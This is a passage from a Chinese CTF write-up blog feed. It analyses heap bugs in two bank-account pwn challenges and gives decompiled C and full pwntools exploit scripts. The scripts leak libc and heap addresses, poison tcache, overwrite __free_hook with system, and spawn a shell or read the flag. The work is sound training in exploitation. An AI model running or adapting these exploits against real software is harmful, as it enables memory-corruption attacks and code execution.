payload += new_password.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input your pasword.&#x27;</span>)</span><br><span class="line">    r.recv(<span class="number">0x84</span> - <span class="built_in">len</span>(<span class="string">&#x27;please input your pasword.&#x27;</span>))</span><br><span class="line">    payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">    payload += old_password.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recv(<span class="number">0x84</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new_account(<span class="string">b&#x27;dzhsb&#x27;</span>, <span class="string">b&#x27;wow&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_account(<span class="string">b&#x27;dzz&#x27;</span>, <span class="string">b&#x27;zzz&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_account(<span class="string">b&#x27;a&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;stat_query&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">0x4</span>+<span class="number">0x18</span>)</span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x21c87</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">r.recv(<span class="number">0x84</span> - <span class="number">0x24</span>)</span><br><span class="line"></span><br><span class="line">cancellation(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">login(<span class="string">b&#x27;dzz&#x27;</span>, <span class="string">b&#x27;zzz&#x27;</span>)</span><br><span class="line">cancellation(<span class="string">b&#x27;zzz&#x27;</span>)</span><br><span class="line">login(<span class="string">b&#x27;dzhsb&#x27;</span>, <span class="string">b&#x27;wow&#x27;</span>)</span><br><span class="line">query()</span><br><span class="line">r.recv(<span class="number">0x40</span> + <span class="number">4</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line">tcache_addr = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(tcache_addr))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + <span class="number">0x3ed8e8</span></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login(flat(tcache_addr), flat(heap_addr))</span><br><span class="line">update_pwd(flat(heap_addr), flat(free_hook))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new_account(<span class="string">b&#x27;&gt;&amp;4&#x27;</span>, <span class="string">b&#x27;cat flag&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line">new_account(<span class="string">b&#x27;196082&#x27;</span>, flat(system_addr), <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;exit_account&#x27;</span>)</span><br><span class="line">login(<span class="string">b&#x27;&gt;&amp;4&#x27;</span>, <span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line">cancellation(<span class="string">b&#x27;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>因为这是cs架构的缘故，没有直接与程序进行交互，所以无法使用<code>system(&quot;/bin/sh&quot;);</code>。考虑使用反弹shell但是需要长度过长了，最后只能用这种重定向的方法传递flag。</p><h2 id="money"><a href="#money" class="headerlink" title="_money"></a>_money</h2><h3 id="利用分析-2"><a href="#利用分析-2" class="headerlink" title="利用分析"></a>利用分析</h3><p>这道题目的逆向部分和上面题目很类似，细心的话可以很快发现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">loan</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __m128i *v0; <span class="comment">// rax</span></span><br><span class="line">  __int64 chunk; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  _DWORD *v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( loan_idx &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    my_puts(<span class="string">&quot;The loan has reached the upper limit of the system.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( *(_DWORD *)(user_list[uid] + <span class="number">0x34</span>LL) )</span><br><span class="line">  &#123;</span><br><span class="line">    my_puts(<span class="string">&quot;You still have a loan that has not been paid off, so you cannot continue to borrow.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    my_puts(<span class="string">&quot;Please enter the loan amount (no more than 1 million).&quot;</span>);</span><br><span class="line">    money = input_l();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)money &gt; <span class="number">0xF4240</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      my_puts(<span class="string">&quot;Don&#x27;t push your luck.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      my_puts(<span class="string">&quot;Please leave your comments.&quot;</span>);</span><br><span class="line">      my_read((<span class="keyword">char</span> *)(loan_money + <span class="number">72LL</span> * loan_idx + <span class="number">0x20</span>), <span class="number">0x20</span>);</span><br><span class="line">      v0 = (__m128i *)(loan_money + <span class="number">72LL</span> * loan_idx);</span><br><span class="line">      chunk = user_list[uid];</span><br><span class="line">      *v0 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)(chunk + <span class="number">8</span>));</span><br><span class="line">      v0[<span class="number">1</span>] = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)(chunk + <span class="number">0x18</span>));</span><br><span class="line">      LODWORD(chunk) = loan_idx;</span><br><span class="line">      v2 = money;</span><br><span class="line">      *(_QWORD *)(loan_money + <span class="number">72LL</span> * loan_idx + <span class="number">0x40</span>) = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)money;</span><br><span class="line">      v3 = (_DWORD *)user_list[uid];</span><br><span class="line">      v3[<span class="number">10</span>] += v2;</span><br><span class="line">      v3[<span class="number">12</span>] += v2;</span><br><span class="line">      v3[<span class="number">14</span>] = chunk;</span><br><span class="line">      v3[<span class="number">13</span>] = <span class="number">1</span>;</span><br><span class="line">      loan_idx = chunk + <span class="number">1</span>;</span><br><span class="line">      my_puts(<span class="string">&quot;The application has been submitted. Please check it.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数中的因为对<code>loan_idx</code>检查不正确导致越界读写。利用思路就是通过越界写修改size，使原本chunk的size变为<code>0x460</code>，释放后进入<code>unsorted bin</code>通过越界读读取libc地址。再通过同样的办法使第一个chunk进入到tcache中去，泄漏出堆地址。最后有两个指针指向同一个地址，理所当然修改tcache中chunk的fd指针即可。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Query&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_account</span>(<span class="params">account, password, money</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;new_account&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the account id&#x27;</span>)</span><br><span class="line">    r.sendline(account)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the password&#x27;</span>)</span><br><span class="line">    r.sendline(password)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the money&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(money), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_account</span>(<span class="params">password</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Cancellation&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please enter the password&#x27;</span>)</span><br><span class="line">    r.sendline(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_info</span>(<span class="params">new_password, old_password</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Update_info&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please entet  a new password&#x27;</span>)</span><br><span class="line">    r.sendline(new_password)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input your password.&#x27;</span>)</span><br><span class="line">    r.sendline(old_password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loan_money</span>(<span class="params">amount, comments</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Loan_money&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Please enter the loan amount (no more than 1 million).&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(amount), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Please leave your comments.&#x27;</span>)</span><br><span class="line">    r.sendline(comments)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repayment</span>(<span class="params">amount</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Repayment&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;How much do you want to repay?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(amount), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_all_loan</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;I&#x27;m vip!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_account</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">account, password</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;login&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the account id&#x27;</span>)</span><br><span class="line">    r.sendline(account)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the password&#x27;</span>)</span><br><span class="line">    r.sendline(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    new_account(<span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x61</span> + i), encoding=<span class="string">&#x27;utf8&#x27;</span>)*<span class="number">0x20</span>,</span><br><span class="line">                <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + i), encoding=<span class="string">&#x27;utf8&#x27;</span>), <span class="number">0x100</span>)</span><br><span class="line">    exit_account()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    login(<span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x61</span> + i), encoding=<span class="string">&#x27;utf8&#x27;</span>)*<span class="number">0x20</span>,</span><br><span class="line">          <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + i), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    loan_money(<span class="number">0x100</span>, <span class="string">b&#x27;dzhsb&#x27;</span>)</span><br><span class="line">    exit_account()</span><br><span class="line"></span><br><span class="line">new_account(flat(<span class="number">0</span>, <span class="number">0x461</span>, [<span class="number">0</span>]*<span class="number">2</span>),</span><br><span class="line">            <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + <span class="number">10</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>), <span class="number">0x100</span>)</span><br><span class="line">exit_account()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    new_account(<span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x61</span> + i + <span class="number">11</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>)*<span class="number">0x20</span>,</span><br><span class="line">                <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + i + <span class="number">11</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>), <span class="number">0xffffffff</span>)</span><br><span class="line">    exit_account()</span><br><span class="line"></span><br><span class="line">login(flat(<span class="number">0</span>, <span class="number">0x461</span>, [<span class="number">0</span>]*<span class="number">2</span>), <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + <span class="number">10</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">loan_money(<span class="number">0x100</span>, <span class="string">b&#x27;dzhsb&#x27;</span>)</span><br><span class="line">exit_account()</span><br><span class="line"></span><br><span class="line">login(flat(<span class="number">0</span>, <span class="string">b&#x27;dzhsb\x00&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span>), flat([<span class="number">0</span>]))</span><br><span class="line">delete_account(flat(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">login(<span class="string">b&#x27;o&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;?&#x27;</span>)</span><br><span class="line">show_all_loan()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Loan account  :&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + <span class="number">0x1eee48</span></span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;elephant&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), <span class="string">b&#x27;/bin/sh\x00&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;196082&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x6</span>), <span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;fuck_man&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>), <span class="string">b&#x27;SB&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x6</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">login(<span class="string">b&#x27;196082&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x6</span>), <span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line">login(<span class="string">b&#x27;elephant&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login(<span class="string">b&#x27;n&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;&gt;&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">show_all_loan()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Loan account  :&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x5d0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;elephant&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), <span class="string">b&#x27;/bin/sh\x00&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;196082&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x6</span>), <span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">login(<span class="string">b&#x27;fuck_man&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>), <span class="string">b&#x27;SB&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x6</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;SB&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x6</span>)</span><br><span class="line"></span><br><span class="line">login(<span class="string">b&#x27;196082&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x6</span>), <span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">password = heap_base + <span class="number">0x620</span></span><br><span class="line">account = heap_base + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">login(flat(account).ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), flat(password))</span><br><span class="line">update_info(flat(free_hook, [<span class="number">0</span>]*<span class="number">4</span>), flat(password))</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;fuck_man&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>), <span class="string">b&#x27;SB&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x6</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>, flat(system_addr), <span class="number">0x0</span>)</span><br><span class="line">exit_account()</span><br><span class="line">login(<span class="string">b&#x27;elephant&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*$rebase(0x187C)&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;diary&quot;&gt;&lt;a href=&quot;#diary&quot; class=&quot;headerlink&quot; title=&quot;diary&quot;&gt;&lt;/a&gt;diary&lt;/h2&gt;&lt;h3 id=&quot;利用分析&quot;&gt;&lt;a href=&quot;#利用分析&quot; class=&quot;headerlink&quot; title=&quot;利用分析&quot;</summary>
      
    
    
    
    <category term="比赛复现" scheme="https://cv196082.gitee.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="UAF" scheme="https://cv196082.gitee.io/tags/UAF/"/>
    
  </entry>
  
  <entry>
    <title>io_uring在kernel pwn中的优异表现</title>
    <link href="https://cv196082.gitee.io/2023/04/20/io-uring/"/>
    <id>https://cv196082.gitee.io/2023/04/20/io-uring/</id>
    <published>2023-04-20T10:13:02.000Z</published>
    <updated>2023-04-20T10:13:20.832Z</updated>
    
